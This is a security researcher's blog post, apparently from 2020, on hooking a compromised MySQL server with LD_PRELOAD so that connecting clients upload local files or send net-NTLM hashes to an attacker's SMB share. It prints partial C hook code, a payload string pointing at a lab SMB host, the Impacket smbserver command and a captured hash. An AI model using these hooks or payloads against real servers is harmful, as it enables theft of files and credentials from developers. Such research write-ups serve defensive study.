@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>That loyal MySQL is a rogue one: a tale of a (partially) failed idea | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="That loyal MySQL is a rogue one: a tale of a (partially) failed idea" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hooking mysqld to steal net-NTLM hashes from developers." />
+<meta property="og:description" content="Hooking mysqld to steal net-NTLM hashes from developers." />
+<link rel="canonical" href="http://localhost:4000/posts/2020/07/12/rogue-mysqld-steal-net-ntlm.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2020/07/12/rogue-mysqld-steal-net-ntlm.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-07-12T03:03:37+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="That loyal MySQL is a rogue one: a tale of a (partially) failed idea" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2020-07-12T03:03:37+02:00","datePublished":"2020-07-12T03:03:37+02:00","description":"Hooking mysqld to steal net-NTLM hashes from developers.","headline":"That loyal MySQL is a rogue one: a tale of a (partially) failed idea","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2020/07/12/rogue-mysqld-steal-net-ntlm.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2020/07/12/rogue-mysqld-steal-net-ntlm.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>12 July 2020</small>
+<h1>That loyal MySQL is a rogue one: a tale of a (partially) failed idea</h1>
+
+
+<p>        
+Last week I read a random post where the author stated that net-NTLM hashes can be stolen via rogue MySQL server. This kind of attacks are really old and are based on how the MySQL protocol works: the server can ask to the client to upload an arbitrary file via <a href="https://dev.mysql.com/doc/refman/8.0/en/load-data.html">LOAD DATA statement</a>. I exploited this issue in the past to leak config files when I could manipulate the connection string used in a web application  (for example forcing it to connect to a emulated MySQL server like <a href="https://github.com/allyshka/Rogue-MySql-Server">Rogue-MySql-Server</a>).</p>
+
+<p>        
+ The idea of getting net-NTLM hashes got stucked in my head because in the past I had situations where I got root on development servers that are outside the domain.  If the servers are outside the domain but the developers are connecting to them from their domain-friendly shiny windows, we can try to steal those juicy Net-NTLM hashes to retrieve passwords or even trying to do a relay and add a computer to the domain and start the hardcore game.</p>
+
+<p>        
+Long story short: <strong>I failed</strong>. It is the year 2020, clients are well configured by default and don’t let you read arbitrary files unless an insecure flag is set. You can steal Net-NTLM hashes if the developer misconfigured its client to accept LOAD DATA statements to upload local files, but you get it from SMB no from WebDav. AFAIK it is not posible to relay from SMB to LDAPs (maybe I am wrong, if it is posible please ping me at twitter (<a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>)).</p>
+
+<p>        
+However I had fun playing a bit with this, so I am writing this article that maybe can help others to don’t lose their time as I did. Also, I believe some concepts explained here can be useful, so… Let’s go!</p>
+
+<h2 id="0x00-the-dark-side-claims-your-mysqld">0x00 The Dark Side claims your mysqld</h2>
+
+<p>        
+The <em>“LOAD DATA local”</em> issue can be exploited in two ways: “server-side” when you can control the connection string from a Web Application, for example; and “client-side” when the clients connect to your rogue MySQL service (via MITM or acting as a honeypot). But if you got root on the server where that MySQL service lies, you can manipulate it at your will and pwn whoever connect.</p>
+
+<p>        
+The easiest way to accomplish this is to install a hook on functions used to send the response messages from the server. If some condition is met we are going to change the original message for the payload used to steal an arbitrary file. The payload is composed like:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//I just used GDB to check the value sent after</span>
+<span class="c1">// LOAD DATA LOCAL INFILE '/tmp/misfits.txt' into table test FIELDS TERMINATED BY "\n";</span>
+<span class="kt">char</span> <span class="n">pwn</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"(byte with size of filepath)</span><span class="se">\x00\x00\x01\xfb</span><span class="s">(filepath)"</span><span class="p">;</span> 
+</code></pre></div></div>
+
+<p>        
+If we can restart the service (not always is posible if it is used in something critical) an approach based on LD_PRELOAD is the best one. You can edit the file used to launch the service and add the env var with your shared object with the hook. If it is not possible the restart, you are going to need to load it as a plugin (I explained it here <a href="https://x-c3ll.github.io/posts/Pivoting-MySQL-Proxy/">“Tunneling traffic through MySQL service (or your mysqld is my new SOCKS5)”</a>) and use <strong>__attribute__((constructor))</strong> to do the magic to install the hooks.</p>
+
+<p>        
+We need to hook <strong>send()</strong> (for when client uses plaintext) and <strong>SSL_write()</strong> (for when client forces SSL/TLS). Following the LD_PRELOAD approach we had to build something like:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+<span class="kt">int</span> <span class="nf">SSL_write</span><span class="p">(</span><span class="n">SSL</span> <span class="o">*</span><span class="n">ssl</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">num</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">returned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">original_SSL_write</span><span class="p">)(</span><span class="n">SSL</span> <span class="o">*</span><span class="n">ssl</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">num</span><span class="p">);</span>
+    
+    <span class="n">original_SSL_write</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"SSL_write"</span><span class="p">);</span>
+    
+   
+    <span class="kt">char</span> <span class="n">pwn</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"payload"</span><span class="p">;</span>
+
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">condition</span><span class="p">...)</span> <span class="p">{</span>
+        <span class="n">original_SSL_write</span><span class="p">(</span><span class="n">ssl</span><span class="p">,</span> <span class="n">pwn</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pwn</span><span class="p">));</span>
+    <span class="p">}</span>
+        <span class="n">returned</span> <span class="o">=</span> <span class="n">original_SSL_write</span><span class="p">(</span><span class="n">ssl</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">num</span><span class="p">);</span>
+    
+    <span class="k">return</span> <span class="n">returned</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">ssize_t</span> <span class="nf">send</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">ssize_t</span> <span class="n">returned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">ssize_t</span> <span class="p">(</span><span class="o">*</span><span class="n">original_send</span><span class="p">)(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
+   
+    <span class="n">original_send</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"send"</span><span class="p">);</span>
+   
+           
+    <span class="kt">char</span> <span class="n">pwn</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"payload"</span><span class="p">;</span>
+ 
+ 
+    <span class="k">if</span> <span class="p">(</span><span class="n">condition</span><span class="p">...)</span> <span class="p">{</span>
+        <span class="n">original_send</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">pwn</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pwn</span><span class="p">),</span> <span class="n">flags</span><span class="p">);</span>
+    <span class="p">}</span> 
+        <span class="n">returned</span> <span class="o">=</span> <span class="n">original_send</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+     
+    <span class="k">return</span> <span class="n">returned</span><span class="p">;</span>
+ <span class="p">}</span>
+ <span class="p">...</span>
+</code></pre></div></div>
+<p>        
+It is <strong>clunky as hell</strong> and you are going to get errors because of packet out of order. This is just a PoC, so don’t worry. In a real usage your hook has to be more “polite” <strong>:P</strong>.</p>
+
+<p>        
+All clients (or at least all I checked) send at some point queries to retrieve information like <code class="language-plaintext highlighter-rouge">select @@version_comment limit 1;</code>, so that can be one of the conditions met to select the message that is going to be edited on the fly. Also we are going to hook recv()/SSL_read in order to store the file stolen.</p>
+
+<p>        
+To test it we need to set the flag <code class="language-plaintext highlighter-rouge">--enable-local-infile</code> (<strong>as I said before: this issue is patched in most clients, don’t get lured by clickbait in articles from Twitter</strong>). Let’s set the payload to read the /etc/hosts, compile, restart the service and connect:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> mothra@arcadia ᐓ  ~/Documentos/research/roguemysql |
+ᐓ   strace -Tfe trace=open mysql -u monty -p --enable-local-infile -h 127.0.0.1
+</code></pre></div></div>
+
+<p>aaaaaaaaand we got it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the MySQL monitor.  Commands end with ; or \g.
+open("/etc/hosts", O_RDONLY)            = 4 &lt;0.000071&gt;  &lt;---- HERE!!!
+Your MySQL connection id is 12
+Server version: 8.0.20
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+open("/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY) = 3 &lt;0.000049&gt;
+open("/lib/terminfo/s/screen-256color", O_RDONLY) = 3 &lt;0.000089&gt;
+open("/home/mothra/.editrc", O_RDONLY)  = -1 ENOENT (No such file or directory) &lt;0.000087&gt;
+open("/home/mothra/.mysql_history", O_RDONLY) = 3 &lt;0.000025&gt;
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt;
+</code></pre></div></div>
+
+<p>        
+Ok, at this point we had a way to read arbitrary files when developers connect to our conquered MySQL. Let’s move to other things.</p>
+
+<h2 id="0x01-windows-being-windows-the-classic-unc-path-trick">0x01 Windows being Windows: the classic UNC path trick</h2>
+
+<p>        
+This is the never-ending story of “You asked for a file; here is your UNC path; now I got a net-NTLM hash”. Nothing new, nothing fancy. Just the same old story. Start the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">smbserver script</a> from Impacket Framework and point your payload to it:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">pwn</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x21\x00\x00\x01\xfb\\\\</span><span class="s">192.168.245.141</span><span class="se">\\</span><span class="s">pwned</span><span class="se">\\</span><span class="s">abcd.jpeg"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>        
+Aaaand connect to it from your windows machine (and again, clients are not vulnerable anymore, you need to set the flag ON PURPOSE):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files\MySQL\MySQL Workbench 8.0 CE&gt;mysql -h 192.168.245.139 -u monty -p --enable-local-infile
+</code></pre></div></div>
+
+<p>        
+You got a hash!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> mothra@arcadia ᐓ  ~/Descargas/impacket/examples |master
+ᐓ   sudo python3 smbserver.py pwned /tmp
+Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (192.168.245.136,1079)
+[*] AUTHENTICATE_MESSAGE (insulapharmacum\psyconauta,INSULAPHARMACUM)
+[*] User INSULAPHARMACUM\psyconauta authenticated successfully
+[*] psyconauta::insulapharmacum:4141414141414141:75ba8ff10ed774b6a6a926fe1335871e:010100000000000080f256d35a58d6019925a63c88f79db70000000001001000560064006d005300440048007900680002001000630048004b006300650055005700750003001000560064006d005300440048007900680004001000630048004b00630065005500570075000700080080f256d35a58d601060004000200000008003000300000000000000001000000002000008942a3658e40bad820a1aa7b82a82b633e2f0720d0c10f258e8b10ca203d46e40a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003200340035002e003100330039000000000000000000
+
+</code></pre></div></div>
+
+<p>        
+The connection is made via SMB. <a href="https://twitter.com/danilj94">@ATTL4S</a> from <a href="https://www.crummie5.club/">Crummie5</a> shared with me <a href="https://github.com/SecureAuthCorp/impacket/issues/544">this ticket from the Impacket repo</a> where it is said that <strong>a relay from SMB to LDAPs is unviable</strong>. I tried to force to do it via WebDav doing the trick of adding a port (\ip@1337) but it not worked, so it looks like a dead end <strong>:/</strong>.</p>
+
+<h2 id="0x02-conclusions">0x02 Conclusions</h2>
+
+<p>        
+I usually write only about stuff that worked, hiding the failures but I believe that something can be learned from this kind of articles. If you enjoyed it, learned something new, or know how to go further with this attack scenario please ping me at <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>.</p>
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
